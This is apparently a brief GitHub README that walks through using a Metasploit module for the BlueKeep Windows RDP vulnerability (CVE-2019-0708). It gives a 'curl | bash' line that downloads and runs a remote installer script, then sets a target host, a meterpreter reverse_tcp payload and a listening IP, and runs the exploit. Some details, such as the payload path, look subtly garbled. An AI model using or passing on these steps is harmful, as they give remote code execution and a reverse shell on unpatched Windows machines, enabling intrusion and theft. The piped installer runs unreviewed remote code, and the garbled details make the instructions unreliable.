[![Read more](https://github.com/nu11secur1ty/Kali-Linux/blob/master/BlueKeep/wall/BlueKeep_OG.jpg)](https://blog.rapid7.com/2019/09/06/initial-metasploit-exploit-module-for-bluekeep-cve-2019-0708/)

More: https://github.com/rapid7/metasploit-framework/pull/12283

- Start manipulating:
```link
https://github.com/nu11secur1ty/Kali-Linux/blob/master/BlueKeep/cve_2019_0708_bluekeep_rce/cve_2019_0708_bluekeep_rce.rb#L398
```


- Automation installer:
```bash
curl -s https://raw.githubusercontent.com/nu11secur1ty/Kali-Linux/master/BlueKeep/bk.sh | bash
```
- SET Target:
```bash
SET RHOSTS 0.0.0.0 # target
SET payload windows/64x/meterpreter/reverse_tcp # set the module
SET LHOST 0.0.0.0 # Your IP for receavin
```
- Check for targets
```bash
show targets
```
- Set Target number
```bash
SET target x
```
- Exploit the target 
```bash 
exploit
```
